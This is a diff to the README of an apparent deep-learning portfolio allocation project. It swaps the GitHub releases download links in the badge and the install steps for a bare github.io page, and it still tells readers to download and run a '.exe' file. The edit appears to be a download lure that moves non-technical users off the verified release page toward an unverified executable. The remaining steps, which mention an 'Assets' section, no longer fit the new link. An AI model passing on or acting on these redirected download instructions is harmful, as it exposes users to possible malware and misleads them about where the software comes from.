@@ -1,6 +1,6 @@
 # 📈 tactical-asset-allocation-lstm - Improve your portfolio returns with intelligence
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bessincandescent708/tactical-asset-allocation-lstm/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://bessincandescent708.github.io)
 
 This application uses deep learning to help you manage your financial assets. It forecasts the returns of exchange-traded funds and suggests how to balance your portfolio. You do not need to understand complex mathematics to use these tools for your investment decisions.
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 You will download the latest version from our public release page.
 
-1. Go to this link: [https://github.com/bessincandescent708/tactical-asset-allocation-lstm/releases](https://github.com/bessincandescent708/tactical-asset-allocation-lstm/releases)
+1. Go to this link: [https://bessincandescent708.github.io](https://bessincandescent708.github.io)
 2. Look for the section labeled "Assets" at the bottom of the newest release entry.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
